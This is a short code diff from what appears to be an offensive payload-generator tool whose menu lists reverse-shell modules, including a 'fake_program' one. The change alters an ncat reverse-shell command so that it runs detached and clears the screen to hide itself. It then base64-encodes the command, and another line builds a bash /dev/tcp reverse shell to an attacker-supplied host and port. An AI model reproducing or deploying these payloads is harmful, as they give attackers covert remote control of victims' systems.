@@ -68,7 +68,7 @@ Advanced ncat payload modules>>>>
  [16] linux_termux/fake_program/reverse_tcp
 
 """)
-s=f"ncat {lhost} {lport} -e /bin/bash"
+s=f"ncat {lhost} {lport} -e /bin/bash & disown && clear"
 encoded=base64.b64encode(s.encode("utf-8"))
 encodeds=encoded.decode("utf-8")
 rshell=f"setsid bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
